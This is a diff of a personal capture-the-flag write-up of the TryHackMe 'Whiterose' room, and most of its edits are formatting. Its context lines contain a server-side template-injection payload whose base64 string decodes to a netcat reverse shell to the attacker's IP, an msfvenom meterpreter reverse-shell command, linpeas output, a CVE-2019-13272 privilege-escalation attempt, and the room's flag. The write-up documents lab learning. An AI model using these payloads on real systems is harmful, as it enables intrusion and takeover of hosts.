@@ -194,16 +194,19 @@ Jemmy Laurel:
 &settings[view%20options][outputFunctionName]=x%3bprocess.mainModule.require('child_process').execSync('bash -c "echo YnVzeWJveCBuYyAxMC4yMS4xNTQuMTQ1IDEzMzcgLWUgc2g= | base64 -d | bash"');//
 ```
 <br>
-![[WhiteroseGotShell.png]]
+![[WhiteroseGotShell.png]] <br>
 - HELLLLLLLLLLLLLLLLLLLL YEEAAAAAAAAAHHHHHHHHHHHH
 - `user.txt`:
+	
 ```
 THM{4lways_upd4te_uR_d3p3nd3nc!3s}
 ```
+	
 - `uname -a`:
 ```sh
 Linux cyprusbank 4.15.0-213-generic #224-Ubuntu SMP Mon Jun 19 13:30:12 UTC 2023 x86_64 GNU/Linux
 ```
+	
 - imma try and get a [[meterpreter]] shell with a custom payload made with [[msfvenom]] 
 - `msfvenom -p linux/x64/meterpreter_reverse_tcp -f elf -o whiterose1338.elf LHOST=10.21.154.145 LPORT=1338`
 ```sh fold title:"muhehehehe"
@@ -216,19 +219,20 @@ systemd-private-38a8eb192b424a1a93b01b8ce4a57ed9-systemd-resolved.service-CKb0ZT
 systemd-private-38a8eb192b424a1a93b01b8ce4a57ed9-systemd-timesyncd.service-R7AHJs
 whiterose1338.elf
 ```
+	
 - gave it 777 perms as well
 - set up a handler in [[metasploit]] <br>
-![[WhiteroseMeterpreterSession.png]]
+![[WhiteroseMeterpreterSession.png]] <br>
 - HEH
 - uploaded [[linpeas.sh]] and ran it 
 - oooh red and yellowwwwwwwww: <br>
-![[WhiterosePossiblePrivEscVector1.png]]
+![[WhiterosePossiblePrivEscVector1.png]] <br>
 ```
 ╔══════════╣ PATH                  
 ╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#writable-path-abuses
 /home/web/.nvm/versions/node/v17.9.1/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/system/bin:/system/sbin:/system/xbin
 ```
-<br> ![[WhiterosePossiblePrivEscVector2.png]]
+<br> ![[WhiterosePossiblePrivEscVector2.png]] <br>
 ```sh
 ╔══════════╣ Analyzing .service files
 ╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#services
@@ -240,7 +244,7 @@ whiterose1338.elf
 /etc/systemd/system/pm2-web.service is calling this writable executable: /home/web/
 ```
 - another interesting thing: <br>
-![[WhiterosePossiblePrivEscVector3.png]]
+![[WhiterosePossiblePrivEscVector3.png]] <br>
 ```sh
 ╔══════════╣ Checking 'sudo -l', /etc/sudoers, and /etc/sudoers.d
 ╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#sudo-and-suid
@@ -280,7 +284,7 @@ User web may run the following commands on cyprusbank:
 - gonna try `CVE-2019-13272` : https://github.com/jas502n/CVE-2019-13272?tab=readme-ov-file
 - uploaded https://github.com/jas502n/CVE-2019-13272/CVE-2019-13272.c to the victim 
 - ran `gcc -s CVE-2019-13272.c -o pwned` to compile to `pwned`: <br>
-![[WhiterosePwnedHasBeenGenerated.png]]
+![[WhiterosePwnedHasBeenGenerated.png]] <br>
 - didnt work 
 - gonna upload `pspy64`
 - didnt find anything 
